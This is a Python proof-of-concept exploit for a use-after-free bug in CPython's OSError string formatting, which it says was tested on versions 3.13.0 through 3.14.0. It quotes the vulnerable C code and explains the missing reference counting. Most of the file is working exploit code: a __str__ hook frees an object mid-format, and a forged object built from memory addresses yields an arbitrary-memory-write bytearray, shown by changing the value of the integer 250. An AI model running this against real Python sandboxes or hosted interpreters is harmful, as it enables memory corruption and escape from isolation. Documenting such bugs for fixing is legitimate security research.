"""
Author: @Nico-Posada
Bug Credits: @Nico-Posada
"""

# TLDR: Some format string specifiers can call python code and we can use that to
#       cause a controlled object to be freed before it's done being used
# Tested to work on 3.13.0, 3.13.1, 3.14.0

# Here is the vulnerable code as of 3.14.0
# https://github.com/python/cpython/blob/v3.14.0/Objects/exceptions.c#L2210-L2254
"""
static PyObject *
OSError_str(PyObject *op)
{
    PyOSErrorObject *self = PyOSErrorObject_CAST(op);
#define OR_NONE(x) ((x)?(x):Py_None)
    /* snip */

    if (self->filename) {
        if (self->filename2) {
            return PyUnicode_FromFormat("[Errno %S] %S: %R -> %R", // <--- %S and %R can call python code
                                        OR_NONE(self->myerrno),
                                        OR_NONE(self->strerror),
                                        self->filename,
                                        self->filename2);
        } else {
            return PyUnicode_FromFormat("[Errno %S] %S: %R", // <--- %S and %R can call python code
                                        OR_NONE(self->myerrno),
                                        OR_NONE(self->strerror),
                                        self->filename);
        }
    }
    if (self->myerrno && self->strerror)
        return PyUnicode_FromFormat("[Errno %S] %S", // <--- %S can call python code
                                    self->myerrno, self->strerror); // <--- myerrno and strerror used without incref'ing beforehand
    return BaseException_str(op);
}
"""

# We have multiple spots where formats that can call python code are used, and the args are passed to the format
# func without incrementing the refcount beforehand. We can abuse this by having the `myerrno` obj have a custom
# `__str__` function that updates the value of `strerror` which will delete the old object. After deleting the old obj
# the format func will still use it, so we can overwrite that memory with a fake object that has our evil object in one of
# its slots and a custom `__str__` function to retrieve that evil object.

from common import evil_bytearray_obj, p_long

class catch:
    __slots__ = ("mem",)
    def __str__(self):
        global mem
        mem = self.mem
        return "x"

class evil:
    def __str__(self):
        global err, _ref
        err.strerror = "old object deleted"
        _ref = fake_obj.ljust(SIZE, b"\0")
        return "x"

class bytes_subclass(bytes):
    pass

# see ./common/common.py for evil bytearray obj explanation
fake_ba, ba_addr = evil_bytearray_obj()

fake_obj = (
    p_long(0x12345) +   # ob_refcnt 
    p_long(id(catch)) + # ob_type
    p_long(ba_addr)  # slot 1 (`mem` in our case)
)

SIZE = 0x100

err = OSError()
err.errno = evil()
err.strerror = bytes_subclass(SIZE - 0x18)

mem = None
"%s" % err # trigger bug
if mem is None:
    exit("failed")

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100